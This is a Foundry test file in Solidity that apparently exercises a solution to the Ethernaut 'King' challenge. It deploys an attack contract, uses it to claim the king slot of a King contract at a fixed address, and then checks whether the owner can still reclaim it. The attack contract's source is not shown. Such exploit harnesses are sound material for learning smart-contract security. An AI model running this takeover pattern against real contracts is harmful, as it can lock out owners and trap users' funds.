// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {King} from "../src/King.sol";
import {KingAttack} from "../src/KingAttack.sol";

contract KingTest is Test {
    function testKing() public {
        King king = King(payable(0x32cd132899B1dd7f48D51aC3D491689b63ba7E4E));
        KingAttack attack = new KingAttack();
        address player = makeAddr("player");
        address owner = king.owner();

        console.log("player %s, owner %s, attack %s", player, owner, address(attack));

        console.log("king %s, prize %d, balance %d", king._king(), king.prize(), address(king).balance);

        vm.deal(player, 1 ether);
        vm.prank(player);
        attack.become_king{value: 0.1 ether}(address(king));

        console.log("king %s, prize %d, balance %d", king._king(), king.prize(), address(king).balance);

        vm.deal(owner, 1 ether);
        vm.prank(owner);
        (bool success,) = payable(address(king)).call{value: 1 wei}("");

        console.log("success %d, king %s, attack balance %d", success, king._king(), address(attack).balance);
    }
}